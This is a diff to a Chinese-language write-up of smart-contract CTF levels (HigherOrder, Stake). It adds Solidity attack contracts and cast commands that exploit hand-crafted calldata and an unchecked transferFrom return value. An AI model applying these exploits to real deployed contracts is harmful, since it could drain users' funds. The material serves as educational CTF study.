@@ -610,6 +610,8 @@ calldata = function_selector(4 bytes)
             + dynamic_arg_data(variable)
 
 ```
+(这个格式仅在函数存在动态类型参数时使用，比如string，bytes等。静态类型的布局参考下一题)
+
 “dynamic”很重要，参数的起始偏移并不是固定的
 
 回到题目的分析上。flipSwitch接收`_data`作为参数，而这个参数用来控制`address(this).call(_data)`处调用的函数
@@ -669,4 +671,52 @@ contract SwitchTest is Test {
         assertTrue(s.switchOn(),"Failed to open the switch");
     }
 }
+```
+## HigherOrder
+
+和上一题类似，即使`registerTreasury`的参数类型是uint8，攻击者仍然可以通过直接操作calldata的方式传入更大的值。函数内部使用的inline assembly阻挡了类型检查
+
+uint8是静态类型，因此calldata的格式如下：
+```
+| 4字节函数选择器 | 32字节编码参数值 |
+```
+（即使uint8根本用不上32字节）
+```solidity
+contract Attack {
+    HigherOrder target=HigherOrder(address());
+    function exploit() public {
+        bytes memory _calldata = abi.encodePacked(
+            bytes4(keccak256("registerTreasury(uint8)")),
+            bytes32(uint256(0x100))
+        );
+        (bool ok, ) = address(target).call(_calldata);
+        require(ok, "Failed to call");
+    }
+}
+```
+## Stake
+
+WETH不是什么新东西，而是ETH的封装版本，仍然符合ERC-20标准，api和普通erc-20没啥不同
+
+StakeWETH里的两个函数选择器对应的函数可以在 https://www.4byte.directory 找到，分别是allowance和transferFrom
+
+我们可以用approve函数给Stake合约一些allowance。更关键的地方在于，StakeWETH没有检查transferFrom的返回值，导致totalStaked和实际ETH数量不一致
+
+四个胜利条件中最难的一点已经完成了。剩下的三个条件基本就是附带的
+```solidity
+contract Attack {
+    Stake target=Stake(address());
+    constructor() public payable {}
+    function exploit() public {
+        IERC20 WETH=IERC20(target.WETH());
+        WETH.approve(address(target),1 ether);
+        target.StakeWETH(1 ether); //条件2
+        target.StakeETH{value:0.0011 ether}(); //条件1：target余额大于0
+    }
+}
+```
+条件3和4用cast命令行：
+```sh
+cast send "" "StakeETH()" --value 0.0011ether --from ""
+cast send "" "Unstake(uint256)" 0.0011ether --from ""
 ```
